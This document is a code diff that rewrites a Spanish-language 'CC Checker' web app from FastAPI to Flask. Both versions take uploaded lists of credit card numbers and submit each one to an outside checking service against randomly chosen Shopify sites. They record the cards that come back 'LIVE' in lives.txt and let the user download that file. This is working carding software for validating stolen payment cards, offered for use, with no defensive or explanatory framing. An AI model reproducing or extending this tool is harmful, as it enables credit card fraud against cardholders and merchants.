@@ -1,148 +1,72 @@
-from fastapi import FastAPI, WebSocket, UploadFile, File
-from fastapi.responses import HTMLResponse
-import random
+from flask import Flask, request, render_template, jsonify, send_file
 import requests
 import os
+import random
+from threading import Thread
 
-app = FastAPI(title="CC Checker Web")
+app = Flask(__name__)
 
-# --- Cargar sitios ---
-if not os.path.exists("sites.txt"):
-    sites = ["https://paperbloom.com"]
-else:
-    with open("sites.txt", "r") as f:
-        sites = [line.strip() for line in f if line.strip()]
+SITES_FILE = "sites.txt"
+RESULTS = []
 
-# --- Función para chequear CC ---
 def check_cc(cc_line, site):
-    url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site}&cc={cc_line}"
+    url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site}&cc={cc_line.strip()}"
     try:
         r = requests.get(url, timeout=20)
-        if r.status_code != 200:
-            return {"cc": cc_line, "status": f"HTTP_ERROR_{r.status_code}", "site": site}
-
-        try:
-            data = r.json()
-        except:
-            return {"cc": cc_line, "status": "INVALID_RESPONSE", "site": site}
-
-        response = data.get("Response", "").upper()
-        if "CARD_DECLINED" in response or "DEAD" in response:
-            return {"cc": cc_line, "status": "DECLINED", "site": site}
-        elif "LIVE" in response:
-            with open("lives.txt", "a") as f:
-                f.write(cc_line + "\n")
-            return {"cc": cc_line, "status": "LIVE", "site": site}
-        elif "HCAPTCHA" in response or "GENERIC_ERROR" in response or "CONNECTION_ABORTED" in response:
-            return {"cc": cc_line, "status": response, "site": site, "retry": True}
+        if r.status_code == 200:
+            try:
+                data = r.json()
+            except:
+                return f"[{cc_line}] ⚠️ Respuesta no válida"
+            response = data.get("Response", "").upper()
+            if "LIVE" in response:
+                with open("lives.txt", "a") as f:
+                    f.write(cc_line + "\n")
+                return f"[{cc_line}] ✅ LIVE"
+            elif "CARD_DECLINED" in response or "DEAD" in response:
+                return f"[{cc_line}] ❌ DECLINED"
+            else:
+                return f"[{cc_line}] ⚠️ {response}"
         else:
-            return {"cc": cc_line, "status": response, "site": site}
+            return f"[{cc_line}] ❌ HTTP {r.status_code}"
     except Exception as e:
-        return {"cc": cc_line, "status": "ERROR", "message": str(e), "site": site, "retry": True}
+        return f"[{cc_line}] ⚠️ Error: {e}"
 
-# --- Página web ---
-@app.get("/", response_class=HTMLResponse)
+def process_ccs(ccs_lines):
+    RESULTS.clear()
+    if not os.path.exists(SITES_FILE):
+        RESULTS.append("❌ No se encontró sites.txt")
+        return
+    with open(SITES_FILE, "r") as f:
+        sites = [line.strip() for line in f if line.strip()]
+    for idx, cc_line in enumerate(ccs_lines, start=1):
+        site = random.choice(sites)
+        msg = check_cc(cc_line, site)
+        RESULTS.append(f"{msg} 📊 Progreso: {idx}/{len(ccs_lines)}")
+
+@app.route("/", methods=["GET", "POST"])
 def index():
-    return """
-    <html>
-        <head>
-            <title>CC Checker en tiempo real</title>
-            <style>
-                body { font-family: Arial; margin: 20px; }
-                #stats { margin-bottom: 20px; }
-                li.live { color: green; }
-                li.declined { color: red; }
-                li.error { color: orange; }
-            </style>
-        </head>
-        <body>
-            <h2>Subir archivo ccs.txt</h2>
-            <form id="uploadForm" enctype="multipart/form-data">
-                <input name="file" type="file" accept=".txt">
-                <button type="submit">Procesar CCs</button>
-            </form>
+    return render_template("index.html")
 
-            <div id="stats">
-                <p>Total procesadas: <span id="total">0</span></p>
-                <p>LIVE: <span id="live">0</span></p>
-                <p>DECLINADAS: <span id="declined">0</span></p>
-                <p>ERRORES: <span id="error">0</span></p>
-                <p>Progreso: <span id="progress">0%</span></p>
-            </div>
+@app.route("/upload", methods=["POST"])
+def upload():
+    file = request.files.get("ccs_file")
+    if file and file.filename.endswith(".txt"):
+        ccs_lines = file.read().decode("utf-8").splitlines()
+        thread = Thread(target=process_ccs, args=(ccs_lines,))
+        thread.start()
+        return jsonify({"status": "started"})
+    return jsonify({"status": "error", "message": "Sube un archivo .txt válido"})
 
-            <ul id="results"></ul>
+@app.route("/progress")
+def progress():
+    return jsonify({"results": RESULTS})
 
-            <script>
-                const form = document.getElementById('uploadForm');
-                const results = document.getElementById('results');
-                const totalSpan = document.getElementById('total');
-                const liveSpan = document.getElementById('live');
-                const declinedSpan = document.getElementById('declined');
-                const errorSpan = document.getElementById('error');
-                const progressSpan = document.getElementById('progress');
+@app.route("/download")
+def download():
+    if os.path.exists("lives.txt"):
+        return send_file("lives.txt", as_attachment=True)
+    return "❌ No hay lives.txt disponible."
 
-                form.onsubmit = async (e) => {
-                    e.preventDefault();
-                    const fileInput = form.querySelector('input[name="file"]');
-                    if (!fileInput.files.length) return alert("Sube un archivo .txt");
-                    
-                    const file = fileInput.files[0];
-                    const reader = new FileReader();
-                    reader.onload = () => {
-                        const lines = reader.result.split("\\n").filter(l => l.includes("|"));
-                        let total = lines.length;
-                        let count = 0;
-                        let liveCount = 0, declinedCount = 0, errorCount = 0;
-
-                        const ws = new WebSocket(`ws://${location.host}/ws`);
-                        ws.onopen = () => ws.send(reader.result);
-
-                        ws.onmessage = (event) => {
-                            const data = JSON.parse(event.data);
-                            const li = document.createElement("li");
-                            li.textContent = `${data.cc} - ${data.status} - ${data.site}`;
-                            if (data.status === "LIVE") li.className = "live";
-                            else if (data.status === "DECLINED") li.className = "declined";
-                            else li.className = "error";
-                            results.appendChild(li);
-
-                            count++;
-                            totalSpan.textContent = count;
-                            if (data.status === "LIVE") liveCount++;
-                            else if (data.status === "DECLINED") declinedCount++;
-                            else errorCount++;
-                            liveSpan.textContent = liveCount;
-                            declinedSpan.textContent = declinedCount;
-                            errorSpan.textContent = errorCount;
-                            progressSpan.textContent = Math.floor((count/total)*100) + "%";
-                        };
-                    };
-                    reader.readAsText(file);
-                }
-            </script>
-        </body>
-    </html>
-    """
-
-# --- WebSocket ---
-@app.websocket("/ws")
-async def websocket_endpoint(websocket: WebSocket):
-    await websocket.accept()
-    content = await websocket.receive_text()   # contenido del archivo
-    lines = [line.strip() for line in content.splitlines() if "|" in line]
-
-    for cc_line in lines:
-        available_sites = sites.copy()
-        random.shuffle(available_sites)
-        processed = False
-        for site in available_sites:
-            result = check_cc(cc_line, site)
-            if result.get("retry", False):
-                continue
-            await websocket.send_text(str(result).replace("'", '"'))
-            processed = True
-            break
-        if not processed:
-            await websocket.send_text(str({"cc": cc_line, "status": "NO_PROCESADO", "site": "Todos"}).replace("'", '"'))
-
-    await websocket.close()
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
